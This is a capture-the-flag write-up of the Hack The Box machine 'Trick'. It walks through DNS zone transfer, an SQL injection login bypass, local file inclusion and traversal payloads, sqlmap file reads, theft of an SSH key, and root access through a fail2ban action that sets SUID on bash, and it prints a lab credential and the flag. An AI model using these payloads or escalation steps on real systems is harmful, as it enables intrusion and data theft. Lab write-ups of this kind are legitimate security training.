Hello and welcome to another write up. This one is on box from Hackthebox - Trick.
Let's get into it and start nmap.

```
└─# cat nmap 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-20 08:02 EDT
Nmap scan report for 10.10.11.166 (10.10.11.166)
Host is up (0.058s latency).
Not shown: 65531 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
As usually starting with the web page and it doesn't return anything which is odd. Probably because
it need hostname. We can get that from the port 53 which is open as we can see from nmap scan results.
For this I will use nslookup but there are other tools that get the job done.
```
# nslookup
server 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa       name = trick.htb.

```
And we have hostname which we now can add to our `/etc/hosts` with the following command 
`# echo "10.10.11.166 trick.htb" >> /etc/hosts`
Let's also check DNS zone transfer if we can get more information. For this I'll use dig:

```
# dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.7-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.

```
We will ad it too. `# echo "10.10.11.166 preprod-payroll.trick.htb" >> /etc/hosts`
Now we can access the pages. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Trick/images/trick_web1.png?raw=true)

Nothing worthwhile here. Let's now move to 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Trick/images/trick_web2.png?raw=true)

We can bypass login with the simpliest sql injection `'or 1=1-- -` and we get to recruitment management system as admin.
Right away I notice parameter page and that the page is using lfi. Directly trying to access files like `?page=/etc/passwd` don't work. But with the knowledge that the page uses php we can use php filters like this:
```
php://filter/convert.base64-encode/resource=index.php
```

This doesn't work either. If we take a look at how it loads other pages it doesn't use the `.php` at the end
so it probably appends that. When we remove that it returns base64 string.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Trick/images/trick_web_lfi.png?raw=true)

There isn't anything interesting on index.php. Let's try to get other pages the same way. When we get the employee
page we see on the top that it includes `db_connect.php`. Time to get that.
We have credentials `remo:TrulyImpossiblePasswordLmao123` we will note that. 
There is nothing more we can do here. Now we go back to the sqlinjection and try to extract some files.
I'll capture the request and save it. Then:
```
# sqlmap -r r.req --level 5 --risk 3 --batch                                                                                                                                                                
```
Technique B tells sqlmap to use boolean based injection. We could also used time based but that takes too long.
Now that sqlmap found the injection point it'll use that right away. Time to get the nginx (we know it's nginx from nmap scan) config file. It is located in `/etc/nginx/sites-enabled/default`. It extracts the file as hex. You can decode it 
for example with cyberchef. The config gave us new subdomain - `preprod-marketing.trick.htb` let's add it to our host file
`# echo "10.10.11.166 preprod-marketing.trick.htb" >> /etc/hosts` 
and visit it.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Trick/images/trick_web3.png?raw=true)

If we click around we find that it also uses the parameter page. With that we can try again our lfi. And it works!
It is doing some kind of input validation but if we use `....//....//....//etc/passwd` payload it returns `/etc/passwd` file. With that we are no longer constrained to `.php` files. We know that there is user michael. Let's see if he has a 
ssh key. And he does. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Trick/images/trick_web4.png?raw=true)

We save it, change the permissions and now we can get in. For privilege escalation I start with `sudo -l`:
```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
``` 
We can restart fail2ban. This is useful and can be used for privilege escalation. Now
we need to change the action that happens when someone gets banned. We need to change the iptables rule for that.
Here we can see that action.d is writable by users from security group. Luckily we are in that group.

```
michael@trick:/etc/fail2ban$ ls -la
total 76
drwxr-xr-x   6 root root      4096 Nov  7 22:21 .
drwxr-xr-x 126 root root     12288 Nov  7 10:14 ..
drwxrwx---   2 root security  4096 Nov  7 22:21 action.d
-rw-r--r--   1 root root      2334 Nov  7 22:21 fail2ban.conf
drwxr-xr-x   2 root root      4096 Nov  7 22:21 fail2ban.d
drwxr-xr-x   3 root root      4096 Nov  7 22:21 filter.d
-rw-r--r--   1 root root     22908 Nov  7 22:21 jail.conf
drwxr-xr-x   2 root root      4096 Nov  7 22:21 jail.d
-rw-r--r--   1 root root       645 Nov  7 22:21 paths-arch.conf
-rw-r--r--   1 root root      2827 Nov  7 22:21 paths-common.conf
-rw-r--r--   1 root root       573 Nov  7 22:21 paths-debian.conf
-rw-r--r--   1 root root       738 Nov  7 22:21 paths-opensuse.conf
michael@trick:/etc/fail2ban$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:/etc/fail2ban$ 

```

The file we need to change is `iptables-multiport.conf`. To get permissions to write to it I'll copy it and then
remove it.

```
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf iptables-multiport.conf.bak
michael@trick:/etc/fail2ban/action.d$ rm iptables-multiport.conf
rm: remove write-protected regular file 'iptables-multiport.conf'? yes
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
```
After that I can rewrite the actionban. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Trick/images/trick_fail2ban.png?raw=true)


Then I'll fail to login to ssh couple of times and when I check `/bin/bash` it now keeps permission if we
use it with the flag -p
```
michael@trick:/etc/fail2ban/action.d$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
michael@trick:/etc/fail2ban/action.d$ bash -p
bash-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root) groups=0(root),1001(michael),1002(security)
```
Now we can get the flag:

```
bash-5.0# cat root.txt 
c7fdea035ec06bef2e8a59af95da00aa
```

This is the end of this box. Thank you for reading this write up. If you have any questions, feedback or suggestion or just want to play ctfs with someone you can reach out to me at
https://twitter.com/Vojtech1337